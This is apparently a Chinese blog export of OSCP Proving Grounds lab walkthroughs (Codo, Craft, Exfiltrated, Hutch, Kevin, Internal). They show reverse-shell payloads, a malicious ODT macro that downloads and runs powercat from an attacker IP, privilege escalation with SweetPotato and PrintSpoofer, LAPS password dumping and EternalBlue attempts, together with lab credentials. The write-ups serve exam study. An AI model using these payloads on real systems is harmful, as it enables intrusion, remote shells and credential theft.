Fedora Core 4 &lt; 11 / Whitebox 4 / CentOS 4) - &#x27;s | linux/local/9479.cLinux Kernel 2.6.19 &lt; 5.9 - &#x27;Netfilter Local Privilege Escalation | linux/local/50135.cLinux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation | linux/local/41886.cLinux Kernel 5.8 &lt; 5.16.11 - Local Privilege Escalation (DirtyPipe) | linux/local/50808.c 下载到靶机上 1234567891011gcc 50808.c $ ./a.out Usage: ./a.out SUID$ ./a.out /usr/bin/su[+] hijacking suid binary..[+] dropping suid shell..[+] restoring suid binary..[+] popping root shell.. (dont forget to clean up /tmp/sh ;))# iduid=0(root) gid=0(root) groups=0(root),1001(prudence) 缓冲区溢出官方workthrough利用redis-status的缓冲区溢出漏洞 思考 查资料的时候看到了 master-slave这种漏洞，然后检查了一下靶机redis为standalone模式，没有尝试，以为自己对redis了解的多，盲目自信，对不了解没有不愿意主动尝试，这种心态大忌","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Codo","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"Scanautorecon Foothold目录爆破 123456789101112131415200 GET 21l 100w 8298c http://192.168.103.23/sites/default/assets/img/profiles/icons/6488ee7e82484.png200 GET 1045l 2095w 45225c http://192.168.103.23/index.php200 GET 463l 925w 10236c http://192.168.103.23/sites/default/assets/oembedget/oembed-get.css200 GET 573l 4542w 234772c http://192.168.103.23/cache/css/aa490a284e2d3749739e0849967c9508.css200 GET 1045l 2095w 45225c http://192.168.103.23/200 GET 165l 471w 8135c http://192.168.103.23/admin/index.php200 GET 165l 471w 8135c http://192.168.103.23/admin/200 GET 19l 93w 1495c http://192.168.103.23/cache/500 GET 0l 0w 0c http://192.168.103.23/routes.php200 GET 16l 60w 937c http://192.168.103.23/sites/200 GET 14l 25w 350c http://192.168.103.23/sys/composer.json200 GET 0l 0w 0c http://192.168.103.23/sys/load.php200 GET 5l 29w 185c http://192.168.103.23/sys/readme.txt200 GET 944l 1731w 32789c http://192.168.103.23/sys/composer.lock200 GET 24l 146w 2518c http://192.168.103.23/sys/ 弱密码admin&#x2F;admin登录之后，看到版本 CodoForum V5.1 123456789101112131415ss codo-------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path-------------------------------------------------------------------------------------------------------------- ---------------------------------CodoForum 2.5.1 - Arbitrary File Download | php/webapps/36320.txtCodoForum 3.2.1 - SQL Injection | php/webapps/40150.txtCodoForum 3.3.1 - Multiple SQL Injections | php/webapps/37820.txtCodoForum 3.4 - Persistent Cross-Site Scripting | php/webapps/40015.txtCodoforum 4.8.3 - &#x27;input_txt&#x27; Persistent Cross-Site Scripting | php/webapps/47886.txtCodoforum 4.8.3 - Persistent Cross-Site Scripting | php/webapps/47876.txtCodoForum v5.1 - Remote Code Execution (RCE) | php/webapps/50978.pyQcodo Development Framework 0.3.3 - Full Information Disclosure | php/webapps/16116.txt-------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results 50987.py 代码写的不咋地，错误也没有日志， 直接搜一下发现利用路径是 1234567891. 上传文件http://192.168.103.23/admin/index.php?page=config2. 执行 http://192.168.103.23/sites/default/assets/img/attachments/backdoor.phpmsfvenom生成backdoor.phpmsfvenom -p php/reverse_php LHOST=192.168.45.229 LPORT=4445 -f raw -o backdoor.php 反弹shell之后，直接上传linpeas并执行 1234Vulnerable to CVE-2021-3560 /var/www/html/sites/default/config.php: &#x27;password&#x27; =&gt; &#x27;FatPanda123&#x27;, 直接黄色背景推荐Vulnerable to CVE-2021-3560， exploit失败 12345678910111213141516chmod +x poc.sh./poc.sh[!] Username set as : secnigma[!] No Custom Timing specified.[!] Timing will be detected Automatically[!] Force flag not set.[!] Vulnerability checking is ENABLED![!] Starting Vulnerability Checks...[!] Checking distribution...[!] Detected Linux distribution as ubuntu[!] Checking if Accountsservice and Gnome-Control-Center is installed[x] ERROR: Accounts service and Gnome-Control-Center NOT found!![!] Aborting Execution!iduid=33(www-data) gid=33(www-data) groups=33(www-data) 查看config.php发现是mysql的账号密码 12345678910111213141516function get_codo_db_conf() &#123; $config = array ( &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;, &#x27;host&#x27; =&gt; &#x27;localhost&#x27;, &#x27;database&#x27; =&gt; &#x27;codoforumdb&#x27;, &#x27;username&#x27; =&gt; &#x27;codo&#x27;, &#x27;password&#x27; =&gt; &#x27;FatPanda123&#x27;, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;charset&#x27; =&gt; &#x27;utf8&#x27;, &#x27;collation&#x27; =&gt; &#x27;utf8_unicode_ci&#x27;,); return $config;&#125; 因为不是完整版的shell,无法执行交互式命令，查看机器上没有mysql, lua等，有perl, socat 测试perl -e ‘exec “&#x2F;bin&#x2F;sh”;’ 执行失败， 使用socat升级shell成功 123456# socat#在本地监听：:socat file:`tty`,raw,echo=0 tcp-listen:4444 #靶机:socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.45.229:4446 mysql登录之后看了一圈没有有用信息 最后测试su root 密码FatPanda123 成功 反思 时间都花在哪了，简单题做了2个小时 收集信息，正常 发现有漏洞版本，正常 利用50978.py， 花了些时间最终还没有执行成功，应该先看利用路径，大概搞明白之后再利用 www-data账号之后，提权收集信息，花了些时间，测试CVE-2021-3560，测试mysql,整体还算正常，但是应该从最明显的开始入手","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Craft","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"scan1234567PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack ttl 125 Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA|_http-title: Craft|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 只开放了80端口 whatweb 1234567WhatWeb report for http://192.168.173.169:80Status : 200 OKTitle : CraftIP : 192.168.173.169Country : RESERVED, ZZSummary : Apache[2.4.48], Bootstrap, Email[admin@craft.offs], HTML5, HTTPServer[Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7], OpenSSL[1.1.1k], PHP[8.0.7], Script, X-Powered-By[PHP/8.0.7] 从版本都找不到可以直接利用的漏洞 目录扫描 1234567891011121314151617181920200 GET 9l 72w 537c http://192.168.173.169/upload.php200 GET 54l 134w 1644c http://192.168.173.169/js/scripts.js200 GET 8l 29w 28898c http://192.168.173.169/assets/favicon.ico200 GET 11270l 21648w 207614c http://192.168.173.169/css/styles.css200 GET 106l 659w 26989c http://192.168.173.169/assets/img/demo-image-01.jpg200 GET 492l 2733w 186437c http://192.168.173.169/assets/img/demo-image-02.jpg200 GET 949l 4824w 385662c http://192.168.173.169/assets/img/bg-masthead.jpg200 GET 165l 663w 9635c http://192.168.173.169/200 GET 165l 663w 9635c http://192.168.173.169/Index.php200 GET 17l 75w 1196c http://192.168.173.169/assets/200 GET 16l 62w 980c http://192.168.173.169/css/503 GET 11l 44w 404c http://192.168.173.169/examples200 GET 165l 663w 9635c http://192.168.173.169/index.php200 GET 16l 63w 981c http://192.168.173.169/js/403 GET 11l 47w 423c http://192.168.173.169/licenses403 GET 11l 47w 423c http://192.168.173.169/phpmyadmin403 GET 11l 47w 423c http://192.168.173.169/server-info403 GET 11l 47w 423c http://192.168.173.169/server-status200 GET 15l 52w 777c http://192.168.173.169/uploads/403 GET 11l 47w 423c http://192.168.173.169/webalizer 发现有uploads assets文件夹 index.php upload.php 直接访问uplaod.php foothold访问80端口，可以上传文件 上传一个文件， 提示仅可上传odt文件 重命名为.odt后上传, 根据提示应该是可以通过投毒的 上传成功之后查看了&#x2F;uploads 和 &#x2F;assets文件夹都是空的，所以也没法通过上传webshell的方式getshell odt搜索odt：OpenOffice Document file https://www.howtogeek.com/765461/what-is-an-odt-file-and-how-do-you-open-one/ 和office一样可以通过宏文件投毒https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html 反弹shell macros: 12345Sub MainShell(&quot;cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.45.169/powercat.ps1&#x27;);powercat -c 192.168.45.169 -p 4444 -e powershell&quot;)End Sub 等待片刻后，反弹shell成功 12345678910nc -nvlp 4444listening on [any] 4444 ...connect to [192.168.45.169] from (UNKNOWN) [192.168.173.169] 50245Windows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\Program Files\\LibreOffice\\program&gt; whoamiwhoamicraft\\thecybergeekPS C:\\Program Files\\LibreOffice\\program&gt; escalation上传winpeas后收集到systeminfo信息 12345678910111213141516171819202122Basic System Information�Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits OS Name: Microsoft Windows Server 2019 Standard OS Version: 10.0.17763 N/A Build 17763 System Type: x64-based PC Hostname: CRAFT ProductName: Windows Server 2019 Standard EditionID: ServerStandard ReleaseId: 1809 BuildBranch: rs5_release CurrentMajorVersionNumber: 10 CurrentVersion: 6.3 Architecture: AMD64 ProcessorCount: 2 SystemLang: en-US KeyboardLang: English (United States) TimeZone: (UTC-08:00) Pacific Time (US &amp; Canada) IsVirtualMachine: True Current Time: 2/4/2025 11:22:06 PM HighIntegrity: False PartOfDomain: False Hotfixes: KB5003541 (6/30/2021), KB4512577 (9/7/2019), KB4535680 (5/28/2021), KB4577586 (5/28/2021), KB4580325 (5/28/2021), KB4589208 (5/28/2021), KB5003243 (5/28/2021), KB5003711 (6/30/2021), KB5004947 (7/13/2021), priv 12345678910whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== ========SeChangeNotifyPrivilege Bypass traverse checking EnabledSeCreateGlobalPrivilege Create global objects EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Disabled user: 123Logged users CRAFT\\thecybergeek CRAFT\\apache 尝试了ms016-32没有成功 尝试获取apache 账户权限，再通过apache账户提权，进入&#x2F;xampp&#x2F;文件夹, uploads和assets都在htdocs目录下，uploads文件夹无法写入，assets有写权限 生成webshell上床1msfvenom -p php/reverse_php LHOST=192.168.45.169 LPORT=4445 -f raw -o r.php 123456789 Directory: C:\\xampp\\htdocsMode LastWriteTime Length Name---- ------------- ------ ----d----- 2/5/2025 12:18 AM assetsd----- 7/13/2021 3:18 AM cssd----- 7/13/2021 3:18 AM jsd----- 2/5/2025 1:30 AM uploads-a---- 7/7/2021 10:53 AM 9635 index.php-a---- 7/7/2021 9:56 AM 835 upload.php 1curl http://192.168.173.169/assets/r.php 1234listening on [any] 4445 ...connect to [192.168.45.169] from (UNKNOWN) [192.168.173.169] 50419whoamicraft\\apache 成功获取apache shell 123456789101112whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ========================================= ========SeTcbPrivilege Act as part of the operating system DisabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeImpersonatePrivilege Impersonate a client after authentication EnabledSeCreateGlobalPrivilege Create global objects EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Disabled 上传SweetPotato和nc 1.\\SweetPotato -a &quot;c:\\users\\public\\nc.exe 192.168.45.169 4446 -e powershell&quot; 12345678910nc -nvlp 4446listening on [any] 4446 ...connect to [192.168.45.169] from (UNKNOWN) [192.168.173.169] 50655Windows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\Windows\\system32&gt; whoamiwhoamint authority\\systemPS C:\\Windows\\system32&gt; 反思 thecybergeek 账户没有更多方式提权时，应该尽早尝试其他账户 apache 提权时，要能和之前web收集的信息联系起来，不能觉得是阶段性的信息，都是有价值的 综合体验下来SweetPotaot更好用，实际是利用PrintSpoofer.exe 1234567下载wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe上传└─$ curl http://192.168.120.63/cmd.php?cmd=powershell%20iwr%20http://192.168.118.14/PrintSpoofer64.exe%20-OutFile%20C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe利用curl http://192.168.120.63/cmd.php?cmd=C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe%20-c%20%22cmd%20/c%20powershell%20-c%20C:/Windows/Tasks/rev.ps1%22","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Exfiterated","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"信息收集 80端口 发现cms subrion 4.2 foothold任意文件上传漏洞 直接通过ip访问，会跳转到http://exfiltrated.offsec绑定hostshttp://exfiltrated.offsec/panel/弱密码 admin:admin 成功进入 exppython3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin注意结尾有个 /成功反弹shell 直接登录后台也可以看到文件上传位置 EP看了提示之后，再次检查crontab 再明显不过了, 但是没有自己意识到下载exp,https://github.com/UNICORDev/exploit-CVE-2021-22204/blob/main/exploit-CVE-2021-22204.py 1python3 exploit-CVE-2021-22204.py -s 192.168.45.188 3333 linux提权方式 crontab sudo suid cap &#x2F;etc&#x2F;passwd ssh&#x2F;authorizd_keys可写 内核漏洞 系统漏洞 反思： 手动检查了以上所有点，但是太不仔细认真了，看到不熟悉的东西容易下意识忽略，看到文件不可写之后放弃了,没具体看文件内容, 多搜索，多记录 mysql、多余的用户coran上浪费了太多时间，经验太不足了，容易陷入兔子洞，但最重要的是容易忽略关键点","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Hutch","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"https://medium.com/@Dpsypher/proving-grounds-practice-hutch-f0152efec895 categoriesAD scan 是一台ad机器，并且是 Domain Controller 端口： 53: DNS over TCP - Simple DNS Plus 80: HTTP Server - WebDav - Microsoft IIS httpd 10.0 88: kerberos service 135 &#x2F; 139 &#x2F; 445: RPC、Netbios、SMB share service 389 &#x2F; 3268 &amp; 636 &#x2F; 3269: LDAP&#x2F;S services 5985 WimRM service 9389: .NET Message Framing service 49xxx: high port RPC services footholddig尝试从DNS server获取 Zone Transfer, 获取所有子域？ 成功了下一步应该做什么? 123456dig @192.168.173.122 AXFR hutch.offsec; &lt;&lt;&gt;&gt; DiG 9.20.2-1-Debian &lt;&lt;&gt;&gt; @192.168.173.122 AXFR hutch.offsec; (1 server found);; global options: +cmd; Transfer failed. smbclient12345678smbclient -L 192.168.173.122 -NAnonymous login successful Sharename Type Comment --------- ---- -------Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 192.168.173.122 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available rpcclient12rpcclient 192.168.173.122 -NCannot connect to server. Error was NT_STATUS_LOGON_FAILURE ldapserarch1ldapsearch -H ldap://192.168.173.122 -x -b &quot;DC=hutch,DC=offsec&quot; |tee ldap_dump 收集所有用户名 12345678910111213141516171819202122232425262728cat ldap_dump |grep -i accountnamesAMAccountName: GuestsAMAccountName: Domain ComputerssAMAccountName: Cert PublisherssAMAccountName: Domain UserssAMAccountName: Domain GuestssAMAccountName: Group Policy Creator OwnerssAMAccountName: RAS and IAS ServerssAMAccountName: Allowed RODC Password Replication GroupsAMAccountName: Denied RODC Password Replication GroupsAMAccountName: Enterprise Read-only Domain ControllerssAMAccountName: Cloneable Domain ControllerssAMAccountName: Protected UserssAMAccountName: DnsAdminssAMAccountName: DnsUpdateProxysAMAccountName: rplacidisAMAccountName: opatrysAMAccountName: ltauntonsAMAccountName: acostellosAMAccountName: jsparwellsAMAccountName: okneesAMAccountName: jmckendrysAMAccountName: avictoriasAMAccountName: jfrareysAMAccountName: eaburrowsAMAccountName: cluddysAMAccountName: agitthousesAMAccountName: fmcsorley AS-REP 确认用户是否存在 下载： https://github.com/ropnop/kerbrute/releases 1kerbrute -domain hutch.offsec -users ./users.txt -dc-ip 192.168.219.122 bloodHount 获取dc信息 1bloodhound -dns-tcp -ns 192.168.173.122 -d hutch.offsec -u &#x27;fmcsorley&#x27; -p &#x27;CrabSharkJellyfish192&#x27; -c all 将文件全部导入bloodHound fmcsorley有读LAPSPassword权限，利用ldapsearch获取mc-MCS-AdmPwd 12345678910111213141516171819202122232425262728293031323334353637-v for verbose-c to ‘run in continuous mode’ (keep going even if there are errors)-D is the ‘bind Domain Name’ldapsearch -v -c -D fmcsorley@hutch.offsec -w CrabSharkJellyfish192 -b &quot;DC=hutch,DC=offsec&quot; -H ldap://192.168.173.122 &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwdldap_initialize( ldap://192.168.173.122:389/??base )filter: (ms-MCS-AdmPwd=*)requesting: ms-MCS-AdmPwd# extended LDIF## LDAPv3# base &lt;DC=hutch,DC=offsec&gt; with scope subtree# filter: (ms-MCS-AdmPwd=*)# requesting: ms-MCS-AdmPwd## HUTCHDC, Domain Controllers, hutch.offsecdn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsecms-Mcs-AdmPwd: k+b2qk88c7&#123;F[Z# search referenceref: ldap://ForestDnsZones.hutch.offsec/DC=ForestDnsZones,DC=hutch,DC=offsec# search referenceref: ldap://DomainDnsZones.hutch.offsec/DC=DomainDnsZones,DC=hutch,DC=offsec# search referenceref: ldap://hutch.offsec/CN=Configuration,DC=hutch,DC=offsec# search resultsearch: 2result: 0 Success# numResponses: 5# numEntries: 1# numReferences: 3 或者使用 impacket-GetLAPSPassword 12345impacket-GetLAPSPassword HUTCH.offsec/fmcsorley:CrabSharkJellyfish192 -dc-ip 192.168.173.122Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companiesHost LAPS Username LAPS Password LAPS Password Expiration LAPSv2-------- ------------- -------------- ------------------------ ------ 使用impacket-psexec登录 123456789101112131415161718impacket-psexec &quot;HUTCH/Administrator@192.168.173.122&quot;Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companiesPassword:[*] Requesting shares on 192.168.173.122.....[*] Found writable share ADMIN$[*] Uploading file whAChRul.exe[*] Opening SVCManager on 192.168.173.122.....[*] Creating service rdga on 192.168.173.122.....[*] Starting service rdga.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.1637](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt; cd /users/administrator/desktopC:\\Users\\Administrator\\Desktop&gt; type proof.txt9f82db6474daaff56457112b4c76693c cadaver https://juggernaut-sec.com/proving-grounds-hutch/ 给出了使用cadaver上传webshell的方式，但是我测试无法利用成功，可能offsec修复了这个漏洞 webdav: 基于Web的分布式编写和版本控制（英语：Web-based Distributed Authoring and Versioning，缩写：WebDAV）是超文本传输协议（HTTP）的扩展，有利于用户间协同编辑和管理存储在万维网服务器文档 80端口webdav 123456789echo &quot;ass&quot; &gt; test.txtcadaver http://192.168.173.122Authentication required for 192.168.173.122 on server `192.168.173.122&#x27;:Username: fmcsorleyPassword:dav:/&gt; put test.txtUploading test.txt to `/test.txt&#x27;:Progress: [=============================&gt;] 100.0% of 4 bytes succeeded. 12curl http://192.168.173.122/test.txtass 反弹shell 1msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.169 LPORT=443 -f aspx &gt; r.aspx 上传 1dav:/&gt; put r.aspx 然后利用 SeimpersonatePrivilege提权","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Kavin","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"scan 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354- osOS: Windows 7 Ultimate N 7600OS version: &#x27;6.1&#x27;OS release: &#x27;&#x27;OS build: &#x27;7600&#x27;Native OS: Windows 7 Ultimate N 7600Native LAN manager: Windows 7 Ultimate N 6.1- ports- 80 HTTPServer[GoAhead-Webs] HP Power Manager Cyclade + /cgi-bin/dose.pl?daily&amp;somefile.txt&amp;|ls|: DailyDose 1.1 is vulnerable to a directory traversal attack in the &#x27;list&#x27; parameter. See: OSVDB-2799 + /cgi-bin-sdb/dose.pl?daily&amp;somefile.txt&amp;|ls|: DailyDose 1.1 is vulnerable to a directory traversal attack in the &#x27;list&#x27; parameter. See: OSVDB-2799 + /forum/memberlist.php?s=23c37cf1af5d2ad05f49361b0407ad9e&amp;what=\\&quot;&gt;\\&quot;&lt;script&gt;javascript:alert(document.cookie)&lt;/script&gt;: Vbulletin 2.2.9 and below are vulnerable to Cross Site Scripting (XSS). See: OSVDB-3280 + /docs/&lt;script&gt;alert(&#x27;Vulnerable&#x27;);&lt;/script&gt;: Nokia Electronic Documentation is vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0801- 139 [V] Trying to get NetBIOS names information, running command: nmblookup -s /tmp/tmpnxrjto4_ -A 192.168.197.45 [92m[+] Got domain/workgroup name: WORKGROUP[0m [92m[+] Full NetBIOS names information: - KEVIN &lt;00&gt; - B &lt;ACTIVE&gt; Workstation Service - WORKGROUP &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Domain/Workgroup Name - WORKGROUP &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Browser Service Elections - KEVIN &lt;20&gt; - B &lt;ACTIVE&gt; File Server Service - WORKGROUP &lt;1d&gt; - B &lt;ACTIVE&gt; Master Browser - ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; Master Browser - MAC Address = 00-50-56-AB-F9-35[0m- 445[V] Trying to get NetBIOS names information, running command: nmblookup -s /tmp/tmpnxrjto4_ -A 192.168.197.45 SMB 1.0: true SMB 2.02: true SMB 2.1: true smb-vuln-ms17-010: | VULNERABLE:| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)| State: VULNERABLE| IDs: CVE:CVE-2017-0143| Risk factor: HIGH| A critical remote code execution vulnerability exists in Microsoft SMBv1| servers (ms17-010).| - 3389 ms-wbt-server- 3573 tag-ups-1- udp 137 netbios-ns foothold题目兔子洞较多 smb 扫描可能有永恒之蓝漏洞，多次尝试未果 web 12341. hp power manager no rce2. cyclade no rce3. dailyDose rce 但是利用不成功 http://192.168.197.45/cgi-bin/dose.pl?daily&amp;somefile.txt&amp;|whoami|4. goahead web server no rce dailyDose 利用失败 cyclade 不是系统级的漏洞 goahead 版本位置，尝试两个rce exploit未果 hp power manager 无rce 1234567891011ss hp power manager---------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Flying Dog Software Powerslave 4.3 Portalmanager - &#x27;sql_id&#x27; Information Disclosure | php/webapps/23163.txtHewlett-Packard (HP) Power Manager Administration - Remote Buffer Overflow (Metasploit) | windows/remote/16785.rbHewlett-Packard (HP) Power Manager Administration Power Manager Administration - Universal Buffer Overflow | windows/remote/10099.pyHP Power Manager - &#x27;formExportDataLogs&#x27; Remote Buffer Overflow (Metasploit) | cgi/remote/18015.rb---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results 看题解是利用缓冲区溢出漏洞 坏字符 123msfvenom -p windows/shell_reverse_tcp -b &quot;\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\\x3d\\x3b\\x2d\\x2c\\x2e\\x24\\x25\\x1a&quot; LHOST=192.168.45.189 LPORT=4444 -e x86/alpha_mixed -f cmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 EXITFUNC=thread -b &quot;\\x00\\x1a\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5&quot; -e x86/alpha_mixed -f python 替换n00bnoob以下部分 最后也没成功 反思 web 弱口令admin:admin进入能看到hp power manager 的版本号，没有第一时间搜索vulns, 心理过于依赖searchsploit了， 并且认为只有rce可以利用，需要积累经验 在看似可利用的点较多时，多次尝试失败导致逐渐不信任前面是不是操作有问题 看到用户名密码后应该搜索默认密码，而不是admin:admin手动撞大运","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"}],"tags":[]},{"title":"Proving Grounds Practice - Internal","date":"2025-03-10T18:47:53.000Z","path":"post/20250311024753.html","text":"scan MS17-0101nmap -vv --reason -Pn -T4 -sV -p 445 &quot;--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)&quot; 192.168.197.40 msf查找17-010永恒之蓝 12345678910111213msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; search 17-010Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 10 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 24 auxiliary/scanner/smb/smb_ms17_010 . normal No MS17-010 SMB RCE Detection . 27 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution use exploit&#x2F;windows&#x2F;smb&#x2F;ms17-010_etenalblue 因为目标机器是32bit, 不成功 123456789msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run[*] Started reverse TCP handler on 10.0.0.82:4444[*] 192.168.197.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check[+] 192.168.197.40:445 - Host is likely VULNERABLE to MS17-010! - Windows Server (R) 2008 Standard 6001 Service Pack 1 x86 (32-bit)[*] 192.168.197.40:445 - Scanned 1 of 1 hosts (100% complete)[+] 192.168.197.40:445 - The target is vulnerable.[-] 192.168.197.40:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets[*] Exploit completed, but no session was created. exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec 利用不成功 123456msf6 exploit(windows/smb/ms17_010_psexec) &gt; run[*] Started reverse TCP handler on 10.0.0.82:4444[*] 192.168.197.40:445 - Target OS: 